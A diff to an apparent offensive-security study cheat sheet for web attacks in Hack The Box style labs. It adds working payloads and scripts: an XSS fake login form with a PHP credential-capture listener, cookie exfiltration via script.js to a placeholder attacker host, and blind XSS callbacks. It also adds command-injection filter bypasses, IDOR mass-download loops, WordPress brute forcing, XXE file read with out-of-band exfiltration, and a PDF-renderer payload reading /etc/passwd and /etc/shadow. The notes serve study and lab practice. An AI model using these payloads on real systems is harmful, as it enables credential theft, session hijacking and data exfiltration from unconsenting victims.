@@ -77,7 +77,7 @@ zaproxy   # or: owasp-zap, Applications menu
 4. Watch the **Alerts** tab. Stop when a **High** severity alert appears.
 5. Right-click the finding's request → **Open/Resend with Request Editor** to manually exploit the found vulnerability.
 
-**Replacer** (auto-modify responses in transit — client-side restriction bypass):
+**Replacer** (auto-modify responses in transit, client-side restriction bypass):
 - `Ctrl+R` → **Add...** → Match Type: **Response Body String** → Match String: `disabled>` → Replacement: `>` → Enable → Save.
 - Every subsequent response from the target has `disabled>` stripped before Firefox receives it. Buttons, fields, and form controls rendered as enabled.
 
@@ -89,27 +89,137 @@ See [[Using Web Proxies (HTB Supplementary)]] (full ZAP Fuzzer, Scanner, Replace
 
 ## XSS Testing and Basic Payloads
 
+**Probe characters**, throw these into any field that gets echoed back and see what survives unencoded:
 ```
 < > ' " { } ;
 ```
-*Throw these into any field that gets echoed back and see what survives unencoded. `<` `>` are HTML tag delimiters, `{` `}` are JS block delimiters, `'` `"` are string delimiters, `;` is a statement terminator. If the app doesn't strip or HTML/URL-encode them, it may be treating your input as code rather than data.*
+`<`/`>` are HTML tag delimiters, `{`/`}` are JS block delimiters, `'`/`"` are string delimiters, `;` is a statement terminator. If the app doesn't strip or HTML-encode them, it may be treating your input as code.
 
+**Proof-of-concept payloads** (use the simplest one that fits the context):
 ```html
-<script>alert(1)</script>
-"><script>alert(1)</script>
-'><img src=x onerror=alert(1)>
+<script>alert(1)</script>                  <!-- standard, inside plain HTML -->
+"><script>alert(1)</script>                <!-- closes a " attribute then injects -->
+'><script>alert(1)</script>                <!-- closes a ' attribute then injects -->
+'><img src=x onerror=alert(1)>             <!-- event-handler variant; works where <script> is blocked or inside DOM sinks -->
+<img src="" onerror=alert(document.cookie)>  <!-- DOM XSS: blank src triggers immediate onerror -->
 ```
+
+**Cookie theft PoC** (replace `alert(1)` with `alert(document.cookie)` in any of the above):
+```html
+<script>alert(document.cookie)</script>
+```
+
 ```bash
 # Delivery via a header instead of a form field, e.g. testing User-Agent for stored XSS
 curl -i http://<target> --user-agent "<script>alert(1)</script>" --proxy 127.0.0.1:8080
 ```
-*Which exact payload lands depends on where your input gets reflected in the page, inside a plain `<div>` vs inside an existing `<script>` block need different shapes.*
 
-> 🔗 **PayloadsAllTheThings** XSS Injection: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md), a much larger payload set for when the basic probes above get filtered.
+**XSS type quick reference:**
+| Type | Payload lives | Who triggers | Detection |
+|------|--------------|-------------|-----------|
+| Stored | Database | All visitors | Submit and view the rendering page |
+| Reflected | URL param / POST body | Whoever opens crafted URL | Manipulate params directly |
+| DOM | Client-side JS source → sink | Whoever opens crafted URL | Compare raw HTTP response vs browser DOM |
 
-See [[Introduction to Web Application Attacks#8.4.3. Identifying XSS Vulnerabilities|8.4.3]], [[Introduction to Web Application Attacks#8.4.4. Basic XSS|8.4.4]], and the WordPress-nonce-theft chain built on top of this in [[Web Applications (Breakdowns)#Nonce theft + eval(String.fromCharCode(...)): stored XSS to WordPress admin account|Command Breakdowns]].
+> 🔗 **PayloadsAllTheThings** XSS Injection: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md), large payload set for filtered contexts. [HackTricks XSS](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/README.md).
 
-#### Tags: #XSS #StoredXSS #ReflectedXSS #XSSPayloads
+### XSS — Phishing via Fake Login Form
+
+When you've confirmed XSS and want to harvest credentials, inject a fake form and run a PHP listener:
+
+```javascript
+// Full payload (replace PWNIP:PWNPO, adjust urlform id to match the page's real form id)
+'><script>document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
+```
+
+**PHP credential capture listener** (save as `index.php`, run in its own directory):
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://TARGET/real-login.php");  // redirect to real site so victim doesn't notice
+    fclose($file);
+    exit();
+}
+?>
+```
+
+```bash
+mkdir -p /tmp/tmpserver && cd /tmp/tmpserver
+# place index.php here, then:
+php -S 0.0.0.0:8080
+```
+
+Credentials arrive as GET params (`?username=admin&password=...`) in the PHP server log.
+
+### XSS — Session Hijacking (Cookie Exfiltration)
+
+When you want to steal a session cookie and impersonate the victim:
+
+**`script.js`** (the exfil payload, loaded via `<script src=...>` in the XSS):
+```javascript
+new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;
+```
+
+`new Image().src` fires a GET request cross-origin without CORS or any visible effect. The cookie string appends as `?c=`.
+
+```bash
+cat << 'EOF' > script.js
+new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;
+EOF
+```
+
+**`index.php`** (PHP cookie capture server, split multiple cookies, write to file):
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+```bash
+# Start server in the directory containing both files:
+php -S 0.0.0.0:8080
+```
+
+**XSS payload to load the script remotely** (inject into vulnerable field):
+```javascript
+"><script src=http://PWNIP:PWNPO/script.js></script>
+```
+
+**Using the stolen cookie** (Firefox DevTools):
+1. Navigate to the target login page
+2. Open DevTools → **Storage** tab → **Cookies** → select the site
+3. Add cookie manually: Name = `session` (or whatever the cookie was named), Value = `<stolen value>`
+4. Refresh, authenticated as victim
+
+### XSS — Blind XSS Detection (Admin Bot Scenarios)
+
+When submitted content goes through an admin review before being visible, you can't see XSS execution directly. Use a unique filename per field to fingerprint via outbound HTTP:
+
+```bash
+# Start listener
+nc -nvlp 9001
+
+# Submit this payload to each form field, substituting the field name:
+'><script src="http://PWNIP:9001/FieldName"></script>
+```
+
+The field that causes a `GET /FieldName` request to arrive at nc is the vulnerable one. The `HeadlessChrome` or `HTBXSS/1.0` User-Agent in the request confirms an automated bot is visiting the page.
+
+Once the vulnerable field is confirmed, swap nc for the full PHP server and use `script.js` + `index.php` (above) to steal the admin's cookie.
+
+See [[Introduction to Web Application Attacks#8.4.3. Identifying XSS Vulnerabilities|8.4.3]], [[Introduction to Web Application Attacks#8.4.4. Basic XSS|8.4.4]], [[Cross-Site Scripting XSS (HTB Supplementary)]] (full phishing/session hijack/blind XSS workflows), and the WordPress-nonce-theft chain in [[Web Applications (Breakdowns)#Nonce theft + eval(String.fromCharCode(...)): stored XSS to WordPress admin account|Command Breakdowns]].
+
+#### Tags: #XSS #StoredXSS #ReflectedXSS #DOMXSS #BlindXSS #SessionHijacking #CookieTheft #XSSPhishing #NewImage #PHPServer
 
 ---
 
@@ -149,6 +259,19 @@ See [[Introduction to Web Application Attacks#8.3.3. Enumerating and Abusing API
 ## WordPress
 
 ```bash
+# WPScan — full enumeration (plugins, themes, users, upload dir, timthumbs)
+wpscan --url http://<target> --enumerate
+
+# User enumeration only
+wpscan --url http://<target> --enumerate u
+
+# Brute force via xmlrpc (faster + often less filtered than wp-login)
+wpscan --password-attack xmlrpc -t 20 -U <user> -P /usr/share/wordlists/rockyou.txt --url http://<target>
+
+# Directory listing on /wp-content/uploads/ (flagged by WPScan when enabled)
+# Browse: http://<target>/wp-content/uploads/YYYY/MM/ — files left publicly accessible
+curl http://<target>/wp-content/uploads/
+
 # Fingerprint installed plugin version (no auth needed)
 curl http://<target>/wp-content/plugins/<plugin-name>/readme.txt
 # Look for the "Stable tag:" line, then search for a matching public exploit
@@ -230,6 +353,337 @@ curl -X POST --data-urlencode 'param=`id`' http://<target>/<endpoint>   # plain 
 See [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (both case studies, including the systematic diagnostic sequence from the capstone).
 
 #### Tags: #CommandInjection #BlindCommandInjection #DiagnosticMethodology
+
+---
+
+## Command Injection — Operator Table
+
+| Operator | URL-encoded | Bash behavior | Output shown |
+|----------|------------|--------------|-------------|
+| `;` | `%3B` | Run both sequentially | Both commands |
+| `\n` (new-line) | `%0a` | Same as `;` in bash | Both commands |
+| `&` | `%26` | Both run; second in background | Both (may interleave) |
+| `&&` | `%26%26` | Second runs only if first succeeds | Both (conditional) |
+| `\|` | `%7c` | Pipe first stdout → second stdin | Second only |
+| `\|\|` | `%7c%7c` | Second runs only if first fails | Second only (conditional) |
+
+**`|` (pipe)** is the cleanest output channel when you only want the injected command's output, not the original command's noise.
+
+**`%0a` (new-line)** is the most commonly missed operator in WAF/filter rules, always try it when `;` is blocked.
+
+**`%26` (`&`)** is often whitelisted as a normal URL query string delimiter; the shell still treats it as a background operator.
+
+See [[Command Injections (HTB Supplementary)#CI.1. Injection Operators|CI.1]].
+
+#### Tags: #CommandInjection #InjectionOperators
+
+---
+
+## Command Injection — Filter Bypass Ladder
+
+When individual characters are filtered, work through this ladder in order:
+
+### Space Filter Bypass
+
+| Bypass | Example | Notes |
+|--------|---------|-------|
+| `$IFS` | `ls$IFS-la` | Internal Field Separator — bash expands to whitespace |
+| `${IFS}` | `ls${IFS}-la` | Explicit brace form; use when `$IFS` is ambiguous |
+| `%09` | `ls%09-la` | URL-encoded tab — bash treats as whitespace |
+| `{cmd,-args}` | `{ls,-la}` | Brace expansion — no space in payload |
+
+### Character Filter Bypass (slashes and other special chars)
+
+```bash
+${PATH:0:1}     # extracts '/' — PATH always starts with /
+${HOME:0:1}     # also extracts '/'
+# Syntax: ${VAR:START:LENGTH} — bash substring
+# Usage:
+cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+ls${IFS}${PATH:0:1}home
+```
+
+### Command Blacklist Bypass (quote insertion)
+
+```bash
+c'a't           # bash strips quotes → runs: cat
+c"a"t           # same — works with double quotes
+w'h'o'a'm'i    # whoami
+l's'            # ls
+/bin/c'a't      # path + command both obfuscated
+```
+
+Bash removes unescaped single/double quotes before execution. String comparison blacklists see `c'a't`, not `cat`.
+
+### Full Obfuscation — Base64
+
+Encode the entire command to bypass all character-level filters at once:
+
+```bash
+# On your Kali box — encode the command
+echo -n 'cat /etc/passwd' | base64
+# Output: Y2F0IC9ldGMvcGFzc3dk
+
+# Decode + execute on the target (no pipe character needed)
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
+```
+
+**`<<<` here-string** feeds a string to a command's stdin without using `|`. Two levels: inner `<<<` feeds the base64 string to `base64 -d`; outer `<<<` feeds the decoded plaintext command to `bash`. No `|` appears in the payload.
+
+**Combined filter bypass payload** (new-line + tab + base64):
+```
+ip=127.0.0.1%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
+```
+
+**Common base64 values:**
+```bash
+echo -n 'cat /flag.txt' | base64   # Y2F0IC9mbGFnLnR4dA==
+echo -n 'id' | base64               # aWQ=
+echo -n 'whoami' | base64           # d2hvYW1p
+```
+
+**Error-based output channel** (skills assessment pattern): make the first command fail (missing argument, invalid path) to trigger the app's error output path, then chain the real command with `&`, the error response leaks the second command's output.
+
+See [[Command Injections (HTB Supplementary)#CI.3. Bypassing Space Filters|CI.3]], [[Command Injections (HTB Supplementary)#CI.4. Bypassing Other Blacklisted Characters|CI.4]], [[Command Injections (HTB Supplementary)#CI.5. Bypassing Blacklisted Commands|CI.5]], [[Command Injections (HTB Supplementary)#CI.6. Advanced Command Obfuscation. Base64|CI.6]].
+
+#### Tags: #CommandInjection #FilterBypass #SpaceBypass #SlashBypass #QuoteInsertion #Base64Obfuscation #HereString #IFS #PATH
+
+---
+
+## HTTP Verb Tampering
+
+Switch the HTTP method to bypass per-method restrictions. Two scenarios:
+
+**1. Basic auth bypass**, server requires auth for GET/POST on a path but not for OPTIONS/PATCH:
+
+```
+# In Burp Repeater: change the request line from
+GET /reset.php HTTP/1.1
+# to
+OPTIONS /reset.php HTTP/1.1
+# or PATCH, HEAD, PUT — try OPTIONS first
+```
+
+**2. Security filter bypass**, a WAF/input filter only checks POST body, not GET params:
+
+```
+# In Burp: right-click → "Change request method"
+# Burp automatically rewrites POST → GET and moves body params to URL query string
+# The endpoint handler reads $_REQUEST (catches GET+POST) so it still works;
+# the filter that checked $_POST never fires
+```
+
+> 🔍 Worth remembering generally: Apache `<Limit GET POST>` and PHP `$_SERVER['REQUEST_METHOD']` checks are the two most common places this misconfiguration lives. If auth or a filter kicks in on POST but not on the alternate method, the access control was only applied to selected methods.
+
+See [[Web Attacks (HTB Supplementary)#WA.1. HTTP Verb Tampering. Basic Auth Bypass|WA.1]], [[Web Attacks (HTB Supplementary)#WA.2. HTTP Verb Tampering. Security Filter Bypass|WA.2]].
+
+#### Tags: #HTTPVerbTampering #BasicAuthBypass #SecurityFilterBypass #OPTIONS
+
+---
+
+## IDOR — Insecure Direct Object Reference
+
+**Mass enumeration (POST-based, extract hrefs):**
+
+```bash
+#!/bin/bash
+url="http://$1"
+for i in {1..20}; do
+    for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); do
+        wget -q $url$link
+    done
+done
+# Usage: bash script.sh STMIP:STMPO
+# Then: ls -lAS <downloaded files> | head; cat flag_*.txt
+```
+
+**Mass enumeration (GET-based, API path, JSON response):**
+
+```bash
+#!/bin/bash
+for uid in {1..100}; do
+    curl -s "http://STMIP:STMPO/api.php/user/$uid"; echo
+done | grep -i "admin" | jq .
+```
+
+**Encoded references (base64 of uid):**
+
+```bash
+# Identify: view page source → href="/download.php?contract=<BASE64>" → echo -n 1 | base64 matches first record
+for i in {1..20}; do
+    for hash in $(echo -n $i | base64 -w 0); do    # -w 0 disables line-wrap
+        curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
+    done
+done
+# ls -lAS to find non-empty file, cat it
+```
+
+**MD5-encoded references:**
+
+```bash
+for i in {1..20}; do
+    hash=$(echo -n $i | md5sum | cut -d' ' -f1)
+    curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
+done
+```
+
+**API IDOR (path-based uid):**
+
+```
+# Intercept: GET /api.php/profile/1 → change 1 to target uid in Burp Repeater
+GET /api.php/profile/5 HTTP/1.1
+# Response JSON contains uuid, role, email — all needed for write operations
+```
+
+**Chaining read → write (account takeover pattern):**
+
+```bash
+# Step 1: get target user's uuid via GET IDOR
+curl -s "http://STMIP:STMPO/api.php/profile/52"
+# {"uid":"52","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","email":"admin@employees.htb"}
+
+# Step 2: intercept your own "Edit Profile" PUT/POST, modify uid+uuid+email to target's values
+# Body: {"uid":"52","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","email":"flag@idor.htb"}
+# → The server accepts uuid as proof of identity; uuid was readable via IDOR
+```
+
+See [[Web Attacks (HTB Supplementary)#WA.3. IDOR. Mass Enumeration|WA.3]]-[[Web Attacks (HTB Supplementary)#WA.6. IDOR. Chaining IDOR Vulnerabilities|WA.6]].
+
+#### Tags: #IDOR #InsecureDirectObjectReference #MassEnumeration #EncodedReferences #APIEnumeration #IDORChain
+
+---
+
+## XXE — XML External Entity Injection
+
+**Identifying XXE:** intercept form submissions, look for `Content-Type: application/xml` or `<?xml` in body. Inject `<!ENTITY test "HELLO">` and reference `&test;` in a reflected field, if "HELLO" appears, entities are resolved.
+
+**Basic file read:**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><email>&xxe;</email></root>
+```
+
+**PHP source disclosure (php://filter — avoids `<?php` breaking raw XML):**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]>
+<root><email>&xxe;</email></root>
+```
+
+Decode the response blob in Burp Inspector or `echo 'BLOB' | base64 -d`.
+
+**CDATA method (for files with XML-breaking chars `<` `>` `&`):**
+
+```bash
+# Step 1: external DTD (on your Kali box)
+echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
+python3 -m http.server 8000
+
+# Step 2: payload
+```
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///flag.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://PWNIP:8000/XXE.dtd">
+  %xxe;
+]>
+<root><email>&joined;</email></root>
+```
+The external DTD assembles `%begin;%file;%end;` → `<![CDATA[<file content>]]>` as the regular entity `&joined;`. CDATA makes the parser treat file content as plain text.
+
+**Error-based (file content appears in parse error — useful when no reflection):**
+
+```bash
+cat > XXE.dtd << EOF
+<!ENTITY % file SYSTEM "file:///flag.php">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+EOF
+python3 -m http.server 8000
+```
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+    <!ENTITY % remote SYSTEM "http://PWNIP:8000/XXE.dtd">
+    %remote;
+    %error;
+]>
+```
+`%nonExistingEntity;` fails → parse error message includes the attempted URI → file content leaks in the error.
+
+**Blind OOB exfiltration (no output at all — watch HTTP server log):**
+
+```bash
+cat > XXE.dtd << EOF
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/path/to/secret.php">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://PWNIP:8000/?content=%file;'>">
+EOF
+python3 -m http.server 8000
+```
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+    <!ENTITY % remote SYSTEM "http://PWNIP:8000/XXE.dtd">
+    %remote;
+    %oob;
+]>
+<root>&content;</root>
+```
+Two requests appear in HTTP server log: DTD fetch, then `GET /?content=BASE64BLOB`. Decode:
+```bash
+echo 'BASE64BLOB' | base64 -d
+```
+
+See [[Web Attacks (HTB Supplementary)#WA.7. XXE. Local File Disclosure|WA.7]]-[[Web Attacks (HTB Supplementary)#WA.9. XXE. Blind Data Exfiltration (OOB)|WA.9]], [[File Upload Attacks (HTB Supplementary)#FUA.6. Limited File Uploads|SVG XXE]], [[File Inclusion (HTB Supplementary)#FI.7. PHP Filters|php://filter]].
+
+#### Tags: #XXE #XMLExternalEntity #LocalFileDisclosure #CDATAMethod #ErrorBasedXXE #BlindXXE #OOBExfiltration #ExternalDTD #PHPFilter
+
+---
+
+---
+
+## SSRF via PDF XMLHttpRequest (Local File Read)
+
+Some web apps generate PDFs server-side by rendering HTML with a headless browser (wkhtmltopdf, Puppeteer, PhantomJS). If user input is embedded in the HTML before rendering, JavaScript executes in the server's context and can read local files.
+
+**Identification:** Input field → app returns a PDF download. Suspect server-side rendering.
+
+**Payload (inject into the field that gets rendered into the PDF):**
+
+```javascript
+<script>
+    x = new XMLHttpRequest;
+    x.onload = function() {
+        document.write(this.responseText)
+    };
+    x.open("GET", "file:///etc/passwd");
+    x.send();
+</script>
+```
+
+Common local file targets:
+
+```
+file:///etc/passwd          → OS users
+file:///etc/shadow          → hashed passwords (if readable)
+file:///flag.txt            → CTF flags in web root
+file:///var/www/html/flag.txt
+file:///proc/net/fib_trie   → internal IP discovery
+file:///proc/self/environ   → environment variables + secret keys
+```
+
+**Why it works:** The headless browser executes JavaScript in the rendering engine. `XMLHttpRequest` with a `file://` URI reads from the server's own filesystem when called from server-side rendering context. The read file contents get written into the PDF's HTML, which then appears in the downloaded PDF.
+
+**Note:** This is NOT an SSRF in the traditional HTTP-request-to-internal-service sense. It's more accurately a Server-Side JavaScript Injection that achieves local file read. However the category is functionally identical for recon purposes, you're exfiltrating data from the server via a forged request origin.
+
+See [[Attacking Enterprise Networks (HTB Supplementary)#AEN.3. Web Enumeration & Exploitation|AEN.3 Q6 (tracking.inlanefreight.local)]] for the example.
+
+#### Tags: #SSRF #PDFInjection #XMLHttpRequest #LocalFileRead #wkhtmltopdf #ServerSideRendering #HTBSupplementary
 
 ---
 
